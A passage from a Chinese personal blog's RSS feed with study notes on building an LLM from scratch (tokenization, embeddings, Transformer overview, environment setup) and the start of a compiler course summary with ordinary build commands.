&lt;li&gt;作为第一步，原始文本被分解为token，这些token可以是单词或字符。然后，这些token被转换为整数表示，称为token ID。&lt;/li&gt;
&lt;li&gt;可以添加特殊token，如 &amp;lt;|unk|&amp;gt; 和 &amp;lt;|endoftext|&amp;gt;，以增强模型的理解能力，并处理各种上下文，例如未知单词或无关文本之间的边界分隔。&lt;/li&gt;
&lt;li&gt;用于像 GPT-2 和 GPT-3 这样的 LLM 的字节对编码（BPE）分词器，可以通过将未知单词分解为子词单元或单个字符，高效地处理这些单词。&lt;/li&gt;
&lt;li&gt;我们在分词后的文本数据上采用滑动窗口方法，以生成用于 LLM 训练的输入-目标对。&lt;/li&gt;
&lt;li&gt;在 PyTorch 中，嵌入层作为一种查找操作，用于检索与token ID 对应的向量。生成的嵌入向量提供了token的连续表示，这在训练像 LLM 这样的深度学习模型时至关重要。&lt;/li&gt;
&lt;li&gt;虽然token嵌入为每个token提供了一致的向量表示，但它们并没有考虑token在序列中的位置。为了解决这个问题，存在两种主要类型的位置嵌入：绝对位置嵌入和相对位置嵌入。OpenAI 的 GPT 模型采用绝对位置嵌入，这些位置嵌入向量会与token嵌入向量相加，并在模型训练过程中进行优化。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;在线文档至此就结束了,可是我发现仓库里还有一些notebook.我来看看有什么内容吧~~&lt;/p&gt;
&lt;h2&gt;多种BPE实践比较&lt;/h2&gt;
&lt;p&gt;在&lt;code&gt;ch02/02_bonus_bytepair-encoder&lt;/code&gt;里有几种GPT-2的BPE调用和性能表现比较.&lt;/p&gt;
&lt;h2&gt;嵌入层和常规线性层的比较&lt;/h2&gt;
&lt;p&gt;在&lt;code&gt;ch02/03_bonus_embedding-vs-matmul&lt;/code&gt;里,解释了嵌入层和独热编码的全连接层是等同的.&lt;/p&gt;
&lt;p&gt;独热编码(onehot)将整数索引放进一个零一矩阵里面来表示索引的位置:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;idx = idx = torch.tensor([2, 3, 1])
onehot = torch.nn.functional.one_hot(idx)
print(onehot)
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;tensor([[0, 0, 1, 0],
        [0, 0, 0, 1],
        [0, 1, 0, 0]])
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;torch.manual_seed(123)
linear = torch.nn.Linear(num_idx, out_dim, bias=False)
print(linear.weight)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;linear.weight&lt;/code&gt;形状是[out_dim, num_idx]&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;linear.weight = torch.nn.Parameter(embedding.weight.T)
linear(onehot.float())
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://sebastianraschka.com/images/LLMs-from-scratch-images/bonus/embeddings-and-linear-layers/4.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;而Linear的调用执行了矩阵乘法:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Next, we initialize a &lt;code&gt;Linear&lt;/code&gt; layer, which carries out a matrix multiplication $X W^\top$:&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;因此,除了初始化的矩阵随机数不同外,两种操作是等价的.但onehot占用内存更大,矩阵乘法更慢.&lt;/p&gt;
&lt;h2&gt;&lt;code&gt;dataloader&lt;/code&gt;的使用&lt;/h2&gt;
&lt;p&gt;在&lt;code&gt;ch02/04_bonus_dataloader-intuition&lt;/code&gt;中简单解释了一下&lt;code&gt;dataloader&lt;/code&gt;的使用,没什么特别的内容.&lt;/p&gt;
&lt;h2&gt;从零构建BPE&lt;/h2&gt;
&lt;p&gt;在&lt;code&gt;ch02/05_bpe-from-scratch&lt;/code&gt;详细讲解了如何从零构建一个BPE,就是上面&amp;quot;多种BPE实践比较&amp;quot;中使用的BPE之一.&lt;/p&gt;
&lt;p&gt;[^1]: Zhou K, Yu H, Zhao W X, et al. Filter-enhanced MLP is all you need for sequential recommendation[C]//Proceedings of the ACM web conference 2022. 2022: 2388-2399.&lt;/p&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Sat, 20 Sep 2025 16:00:00 GMT</pubDate></item><item><title>理解大预言模型 | LLM</title><link>https://tankimzeg.top/blog/llm/ch1_understand-llms/</link><guid isPermaLink="true">https://tankimzeg.top/blog/llm/ch1_understand-llms/</guid><description>从零构建大语言模型第1章:本章介绍了Transformer架构和GPT-like LLM</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/llm/ch1_understand-llms/&quot;&gt;https://tankimzeg.top/blog/llm/ch1_understand-llms/&lt;/a&gt;&lt;/blockquote&gt; &lt;h2&gt;介绍Transformer架构&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter1/figure1.4.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;为什么编码器的Embeddings能作为解码器的输入来翻译?解码器不是用来预测下一个词的吗?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;我在学习编译原理的时候想过用用于机器翻译任务,这是DeepSeek的回答:&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;p&gt;这是一个非常棒的问题，它触及了自然语言处理（NLP）发展的核心脉络。你的直觉很对，早期的机器翻译（MT）和编译原理的前端（词法分析、语法分析）确实共享了非常相似的思想——&lt;strong&gt;基于规则和符号的精确处理&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;然而，我们之所以没有用这种“机翻思想”来制作现代大语言模型（LLM），是因为这两种范式在哲学和技术上存在着根本性的差异。简单来说，&lt;strong&gt;编译原理是“确定性”的，而自然语言是“概率性”的&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;下面我们从几个关键维度进行详细对比，来解释为什么后者不适用：&lt;/p&gt;
&lt;hr&gt;
&lt;h3&gt;1. 核心哲学：规则 vs. 统计&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;编译原理前端（传统机翻思想）&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;方法&lt;/strong&gt;：基于一套&lt;strong&gt;精确、预定义、手工编写&lt;/strong&gt;的规则。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;过程&lt;/strong&gt;：输入源代码 -&amp;gt; &lt;strong&gt;词法分析器（Lexer）&lt;/strong&gt; 根据正则规则切分成Token -&amp;gt; &lt;strong&gt;语法分析器（Parser）&lt;/strong&gt; 根据上下文无关文法（CFG）等规则构建&lt;strong&gt;确定的&lt;/strong&gt;语法树（AST）-&amp;gt; 进行语义分析。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;特点&lt;/strong&gt;：这是一个&lt;strong&gt;确定性的过程&lt;/strong&gt;。同一段代码，每次解析得到的AST都完全一样。规则是二元对错的，没有“好像可能大概”这种模糊概念。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;大语言模型（LLM）&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;方法&lt;/strong&gt;：基于从海量数据中学习到的&lt;strong&gt;统计概率&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;过程&lt;/strong&gt;：模型通过学习万亿级别的词汇共现关系，形成一个&lt;strong&gt;高维概率模型&lt;/strong&gt;。当它收到一个提示（Prompt）时，它不是在“解析”句子，而是在计算“&lt;strong&gt;在给定上文的情况下，下一个最可能出现的词或字是什么&lt;/strong&gt;”，并依此逐个生成（自回归）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;特点&lt;/strong&gt;：这是一个&lt;strong&gt;概率性的过程&lt;/strong&gt;。同一个提示，每次生成的结果都可能略有不同。它的输出是一个概率分布，选择哪个词存在随机性。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;2. 处理歧义的能力&lt;/h3&gt;
&lt;p&gt;这是两种范式最根本的区别。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;编译原理&lt;/strong&gt;：要求语言&lt;strong&gt;无歧义&lt;/strong&gt;。设计编程语言的首要目标就是消除歧义，确保每个合法程序只有一种解析方式。如果代码有歧义（语法错误或设计缺陷），编译就会失败。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;自然语言&lt;/strong&gt;：&lt;strong&gt;充满歧义&lt;/strong&gt;。这是核心特征。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;词法歧义&lt;/strong&gt;：“苹果”指的是水果还是公司？&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;语法歧义&lt;/strong&gt;：“咬死了猎人的狗” 是狗被咬死了，还是狗咬死了猎人？&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;语义歧义&lt;/strong&gt;：“她的头发很长” 是字面意思，还是比喻她见识短？&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;基于规则的系统&lt;/strong&gt; 处理歧义需要编写极其复杂且会相互冲突的规则，覆盖 corner case 的成本极高，最终会陷入“规则爆炸”的困境。
&lt;strong&gt;基于统计的LLM&lt;/strong&gt; 通过上下文来解决歧义。它通过计算“咬死了”、“猎人的”、“狗”这些词在一起出现的概率，来判断最可能的语义关系。它接受模糊性，并给出一个“最可能”的答案。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;3.  robustness（鲁棒性）与容错性&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;编译原理&lt;/strong&gt;：非常&lt;strong&gt;脆弱&lt;/strong&gt;。哪怕只缺少一个分号 &lt;code&gt;;&lt;/code&gt;，或者错了一个括号，整个解析过程就会立即失败，并抛出一个语法错误。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;大语言模型&lt;/strong&gt;：非常&lt;strong&gt;鲁棒&lt;/strong&gt;。即使你的输入有错别字、语法不通顺、中英文混杂，LLM 依然能&lt;strong&gt;大概率&lt;/strong&gt;理解你的意图并给出合理的回答。因为它见过海量不规范的网络文本，它学习的是语义的“模糊映射”，而不是严格的“符号逻辑”。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;4. 创造性与泛化能力&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;编译原理&lt;/strong&gt;：&lt;strong&gt;没有创造性&lt;/strong&gt;。它只能处理符合预定义规则的情况。无法生成全新的、超出规则范围的代码或表达。它的能力上限在规则编写完成时就已经被锁死了。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;大语言模型&lt;/strong&gt;：&lt;strong&gt;具有涌现的创造性&lt;/strong&gt;。它可以写诗、编故事、进行哲学思辨、解决从未见过的新问题（In-context Learning）。这种能力来自于它从数据中学习到的极其复杂的模式，而不是显式的规则。它可以生成训练数据中不存在但又合情合理的表达。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;历史的视角：这其实正是NLP走过的路&lt;/h3&gt;
&lt;p&gt;你的问题其实完美地描述了自然语言处理领域的历史演变：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;1950s-1980s：规则主义时代&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;人们最初的想法和你完全一样，试图用编写语法规则（类似编译原理）的方法让机器理解和翻译语言。这被称为&lt;strong&gt;基于规则的机器翻译（RBMT）&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;结果&lt;/strong&gt;：失败告终。系统非常脆弱，无法处理复杂多变的真实语言，开发和维护成本巨大。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;1990s-2010s：统计时代&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;人们转向了数据驱动的统计方法，例如&lt;strong&gt;基于统计的机器翻译（SBTM）&lt;/strong&gt;。它不再依赖语言学家编写规则，而是通过分析大量双语语料库，学习翻译的概率模型。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;结果&lt;/strong&gt;：取得了巨大成功（比如早期的谷歌翻译），但模型仍然较为简单，需要复杂的特征工程。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;2010s-至今：神经网络与LLM时代&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;深度学习&lt;/strong&gt;和&lt;strong&gt;Transformer架构&lt;/strong&gt;的出现，使得我们可以构建极其庞大的神经网络（LLM），它们本质上是最极致的统计模型，能够捕获语言中更微妙、更复杂的概率关系。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;结果&lt;/strong&gt;：带来了革命性的突破，模型的能力实现了质的飞跃。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h3&gt;总结：为什么不能用？&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;left&quot;&gt;特性&lt;/th&gt;
&lt;th align=&quot;left&quot;&gt;编译原理前端（传统机翻思想）&lt;/th&gt;
&lt;th align=&quot;left&quot;&gt;大语言模型（LLM）&lt;/th&gt;
&lt;th align=&quot;left&quot;&gt;结论&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&quot;left&quot;&gt;&lt;strong&gt;哲学&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;基于&lt;strong&gt;规则&lt;/strong&gt;与&lt;strong&gt;符号&lt;/strong&gt;的确定性推理&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;基于&lt;strong&gt;数据&lt;/strong&gt;与&lt;strong&gt;统计&lt;/strong&gt;的概率性生成&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;根本范式不同&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;left&quot;&gt;&lt;strong&gt;歧义处理&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;要求&lt;strong&gt;无歧义&lt;/strong&gt;，否则失败&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;接受歧义，给出&lt;strong&gt;最可能&lt;/strong&gt;解释&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;LLM能处理自然语言的核心特征&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;left&quot;&gt;&lt;strong&gt;鲁棒性&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;&lt;strong&gt;脆弱&lt;/strong&gt;，严格容错&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;&lt;strong&gt;强壮&lt;/strong&gt;，容忍错误和不规范输入&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;LLM适用于真实世界的不完美语言&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;left&quot;&gt;&lt;strong&gt;创造性&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;&lt;strong&gt;无&lt;/strong&gt;，能力受规则限制&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;&lt;strong&gt;有&lt;/strong&gt;，可涌现出新能力&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;LLM能完成开放域任务&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;left&quot;&gt;&lt;strong&gt;开发成本&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;依赖专家&lt;strong&gt;手工编写&lt;/strong&gt;规则，成本高&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;依赖&lt;strong&gt;算力和数据&lt;/strong&gt;，规则自动学习&lt;/td&gt;
&lt;td align=&quot;left&quot;&gt;LLM的扩展性远超人工系统&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;因此，不是“不能”用，而是历史已经证明，那种方法在处理开放域、充满歧义的自然语言时是一条&lt;strong&gt;效率低下且能力有限&lt;/strong&gt;的路径。大语言模型的&lt;strong&gt;概率生成范式&lt;/strong&gt;是远比&lt;strong&gt;规则符号范式&lt;/strong&gt;更适合处理自然语言的技术路径。&lt;/p&gt;
&lt;p&gt;最终，编译原理教会了我们如何让机器&lt;strong&gt;精确地服从&lt;/strong&gt;，而大语言模型则是在尝试让机器&lt;strong&gt;模糊地理解&lt;/strong&gt;。两者适用于完全不同的领域。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Transformer的编码器演化成了BERT,而解码器演化成了GPT:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter1/figure1.5.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2&gt;利用大型数据集&lt;/h2&gt;
&lt;p&gt;GPT-3 的预训练费用估计为 460 万美元,使用了几千亿token的数据集来训练.所以要训练出&amp;quot;有智慧&amp;quot;的GPT是需要耗费大量资源的,不只是算法的挤牙膏.&lt;/p&gt;
&lt;p&gt;有许多经过预训练的开源LLM，可以作为通用工具来撰写、提取和编辑不在训练数据中的文本。此外，LLM可以在相对较小的数据集上进行微调，以减少所需的计算资源并提高特定任务的性能。&lt;/p&gt;
&lt;p&gt;像 GPT-3 这样的模型架构明显大于原始的 Transformer 模型。例如，原始的 Transformer 将编码器和解码器块重复了六次，而 GPT-3 具有 96 层 Transformer，总共有 1750 亿个参数。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter1/figure1.8.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;模型能够执行未明确训练的任务被称为“涌现行为”。这种能力不是通过明确的训练获得的，而是模型接触大量多语言数据和多样化上下文后自然而然涌现的结果。这展示了这些大语言模型的优势和能力.&lt;/p&gt;
&lt;h2&gt;构建大语言模型&lt;/h2&gt;
&lt;p&gt;在本书,我们将从零开始编码一个GPT-like LLM.&lt;/p&gt;
&lt;p&gt;构建LLM需要的步骤:
&lt;img src=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN/Image/chapter1/figure1.9.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;首先，我们将学习基本的数据预处理步骤，并编写 LLM 核心的注意力机制代码。&lt;/p&gt;
&lt;p&gt;接下来，在第二阶段，我们将学习如何编写代码并预训练一个类似 GPT 的 LLM，能够生成新的文本。同时，我们还会介绍评估 LLM 的基本原理，这对开发强大的 NLP（自然语言处理）系统至关重要。&lt;/p&gt;
&lt;p&gt;请注意，从头开始预训练一个 LLM 是一项庞大的工程，对于类似 GPT 的模型，计算成本可能高达数千到数百万美元。因此，第二阶段的重点是进行教学目的的训练，使用小型数据集。此外，本书还将提供关于如何加载公开可用的模型权重的代码示例。&lt;/p&gt;
&lt;p&gt;最后，在第三阶段，我们将使用一个预训练好的 LLM，对其进行微调，使其能够执行指令，例如回答查询或进行文本分类——这些是在许多现实世界应用和研究中最常见的任务。&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;本章摘要&lt;/strong&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;LLM 已经彻底改变了自然语言处理的领域，之前自然语言处理主要依赖于显式的规则系统和较为简单的统计方法。LLM 的出现引入了新的深度学习驱动的方法，推动了对人类语言的理解、生成和翻译的进步。&lt;/li&gt;
&lt;li&gt;现代 LLM 的训练通常分为两个主要步骤：&lt;ul&gt;
&lt;li&gt;首先，它们在一个大型未标注的文本语料库中进行预训练，通过使用句子中下一个单词的预测作为“标签”。&lt;/li&gt;
&lt;li&gt;这些模型接下来会在一个较小的、有标签的目标数据集上进行微调，以遵循指令或执行分类任务。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;LLM 基于Transformer架构。Transformer架构的核心理念是注意力机制，这使得 LLM 在逐字生成输出时，能够选择性地访问整个输入序列。&lt;/li&gt;
&lt;li&gt;原始的Transformer架构由一个用于解析文本的编码器和一个用于生成文本的解码器组成。&lt;/li&gt;
&lt;li&gt;生成文本和执行指令的 LLM，例如 GPT-3 和 ChatGPT，仅实现解码器模块，这使得架构更加简化。&lt;/li&gt;
&lt;li&gt;由数十亿个单词构成的大型数据集对预训练 LLM 至关重要。在本书中，我们将实现并在小型数据集上训练 LLM，以便用于教学，同时也会探讨如何加载公开可用的模型权重。&lt;/li&gt;
&lt;li&gt;类似 GPT 的模型的普遍预训练任务是预测句子中的下一个单词，但这些 LLM 显示出了“涌现”特性，例如具备分类、翻译或文本总结的能力。&lt;/li&gt;
&lt;li&gt;一旦 LLM 完成预训练，得到的基础模型就可以更高效地微调，以应对各种下游任务。&lt;/li&gt;
&lt;li&gt;在自定义数据集上微调过的 LLM 能够在特定任务上超越通用 LLM。&lt;/li&gt;
&lt;/ul&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Fri, 19 Sep 2025 16:00:00 GMT</pubDate></item><item><title>学习资料与环境配置 | LLM</title><link>https://tankimzeg.top/blog/llm/ch0/</link><guid isPermaLink="true">https://tankimzeg.top/blog/llm/ch0/</guid><description>开了新坑:从零构建大语言模型(LLMs From Scratch)</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/llm/ch0/&quot;&gt;https://tankimzeg.top/blog/llm/ch0/&lt;/a&gt;&lt;/blockquote&gt; &lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;git clone --depth=1 https://github.com/rasbt/LLMs-from-scratch.git
cd LLMs-from-scratch
uv sync
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;出现了&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Using CPython 3.13.0
Creating virtual environment at: .venv
Resolved 191 packages in 24m 23s
error: Distribution `tensorflow==2.18.1 @ registry+https://pypi.mirrors.ustc.edu.cn/simple/` can&amp;#39;t be installed because it doesn&amp;#39;t have a source distribution or wheel for the current platform

hint: You&amp;#39;re using CPython 3.13 (`cp313`), but `tensorflow` (v2.18.1) only has wheels with the following Python ABI tags: `cp310`, `cp311`, `cp312`
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这时候需要在&lt;code&gt;pyprojext.toml&lt;/code&gt;中把&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-toml&quot;&gt;requires-python = &amp;quot;&amp;gt;=3.10,&amp;lt;=3.13&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;改成&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-toml&quot;&gt;requires-python = &amp;quot;&amp;gt;=3.10,&amp;lt;=3.12&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;再次执行即可&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/rasbt/LLMs-from-scratch&quot;&gt;LLMs-from-scratch&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://skindhu.github.io/Build-A-Large-Language-Model-CN&quot;&gt;从零构建大语言模型(中文版)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本想着装一台新电脑,有独立显卡再来学这些深度学习,最近先学C++和数据库系统.但C++丑陋的语法让我难以接受,入门失败.数据库系统也比我想象中的要复杂得多,离开CMU15-445的bustub从零开始用Rust写DBMS可是一项浩瀚的工程.无奈只好暂时搁置(课程视频我还是在看的,在实习单位用空闲时间看,写的是纸质版的笔记).&lt;/p&gt;
&lt;p&gt;我想起了前段时间发现的这个入门大语言模型的教程(上次入门还是在大一,那些自傲的家伙把我抛弃了,真是给他们闹麻了.如果他们知道我现在的水平会不会后悔少了一个打工的牛马呢?)&lt;/p&gt;
&lt;p&gt;我对这群趋之若鹜的人十分鄙夷,代码都不会写几行,整天嘴上说自己研究什么&amp;quot;越狱&amp;quot;,&amp;quot;微调&amp;quot;装B,说着说着自己都信了.自知自己数学垃圾甚至不敢选机器学习的课,纯纯笑料.人与人之间,性格差异怎么会这么大,怎么能无耻到这个地步.靠着这一嘴到处混人际关系,得到了不少帮助.&lt;/p&gt;
&lt;p&gt;这玩意火了这么多年,不知道水了多少虚假论文,成就了多少人的功名,救了多少混圈子的人.可是真正有贡献的成果才几个呢?除此之外的垃圾&amp;quot;成果&amp;quot;有什么实际意义呢?&lt;/p&gt;
&lt;p&gt;从上世纪发明的传统机器学习算法,到Hinton的手写体识别网络,再到Transformer架构,近年火出圈的GPT,靠的还不是全网海量的数据砸钱训练出来的.一上大学就开始搞这个,属实是本末倒置.基础不牢,是走不远的.大一的时候,我就看了&lt;em&gt;Attention is All You Need&lt;/em&gt;原文,自己思考了几天,我就基本上知道是怎么回事了.加上高中的时候,我已经学过微积分和线性代数,可以说有着得天独厚的条件,但我洞察到水平还差得远,于是从编程基础开始学习.越是别人趋之若鹜的事物,越要冷静观察.他们不过是几个赚足了信息差的本科生,装得牛逼轰轰,带我不过是想让我给他们当牛马,每天高强度看文献给他们汇报想法.虽然当时我还不知道我想要干什么,但我知道这肯定不是我想要的.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;弃我去者,昨日之日不可留.当我重新看到这些东西的时候,我已经不是当年的我了&lt;/p&gt;
&lt;/blockquote&gt;
</content:encoded><dc:creator>TanKimzeg</dc:creator><pubDate>Fri, 19 Sep 2025 16:00:00 GMT</pubDate></item><item><title>课程总结 | 编译原理</title><link>https://tankimzeg.top/blog/compiler/sumary/</link><guid isPermaLink="true">https://tankimzeg.top/blog/compiler/sumary/</guid><description>PKU编译原理实践课程</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://tankimzeg.top/blog/compiler/sumary/&quot;&gt;https://tankimzeg.top/blog/compiler/sumary/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;终于给PKU-MiniC的旅途画上了一个句号,实现了一个能编译C语言子集的编译器.&lt;/p&gt;
&lt;h3&gt;局限&lt;/h3&gt;
&lt;p&gt;目前还没对代码进行编译时优化,临时变量都放在栈里,没有充分利用寄存器分配.我们都知道,寄存器的存取速度和CPU缓存\内存之间差了一个数量级,这就导致代码运行效率低,相当于给每个变量都加上了&lt;code&gt;votatile&lt;/code&gt;关键字.&lt;/p&gt;
&lt;p&gt;说白了,现在的编译器&lt;del&gt;没有什么实用性(学生项目都这样嘛)&lt;/del&gt;只是一个玩具,还有很长的路要走.当然了,做编译器是没有终点的,编译器的标杆GCC已经是庞然大物了.而对于复杂的语言,rustc也在不断改进.&lt;/p&gt;
&lt;h3&gt;成就&lt;/h3&gt;
&lt;p&gt;容器里面自带的130个测试全部通过,下面的lisp.c也能正常使用,应该没有什么bug了吧.&lt;/p&gt;
&lt;p&gt;SysY语言是图灵完备的.这意味着我可以用它编写任何程序.&lt;/p&gt;
&lt;p&gt;编译原理可谓是计算机科学的屠龙术之一,由此开启计算机软件的世界.比如SysY编写的Lisp语言解释器.&lt;/p&gt;
&lt;h3&gt;编译与链接&lt;/h3&gt;
&lt;p&gt;在编译lisp.c之前,先来研究一下怎么编译链接成可执行文件.容器中的&lt;code&gt;autotest&lt;/code&gt;测试脚本是Python写的.借鉴这个脚本,ChatGPT5写出了Makefile,我就不详细介绍了.&lt;/p&gt;
&lt;p&gt;在&lt;code&gt;tests&lt;/code&gt;下运行&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;make clean
make SRC=./lisp.c MODE=koopa 2&amp;gt;/dev/null
./build/lisp &amp;lt; input.lisp
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;或者&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;make clean
make SRC=./lisp.c MODE=riscv 2&amp;gt;/dev/null
qemu-riscv32-static ./build/lisp &amp;lt; input.lisp
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;即可执行Lisp脚本.对于测试单例来说,会输出斐波那契数列的第20个数.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;必须赞赏,本课程设计还是很合理的,学习曲线时平时陡,取决于重构代码的决心和毅力.文档质量也很高,但有小部分过于简略,忽略了重要细节,给代码编写造成了一些困惑.MaxXing助教编写文档和中间件花了很多心血,使得我们新手入手不是特别困难.Respect!&lt;/p&gt;
&lt;p&gt;回想之前,面对‘编译器’这三个字还没有什么概念,只觉得它十分聪明.现在回头看,收获不仅是这个‘玩具’本身，还有整个过程锻炼我的能力: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;拆解问题的能力&lt;/strong&gt;：一个庞大的工程被横向分解成词法分析、语法分析、语义分析、IR生成、代码优化、目标代码生成多个步骤,纵向分解成9个level后，每一步都变得清晰可行。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;深度调试的耐心&lt;/strong&gt;：为了一个bug，能对着生成的汇编代码和日志琢磨一晚上，这种‘强迫症’现在成了我解决问题的利器。&lt;/p&gt;
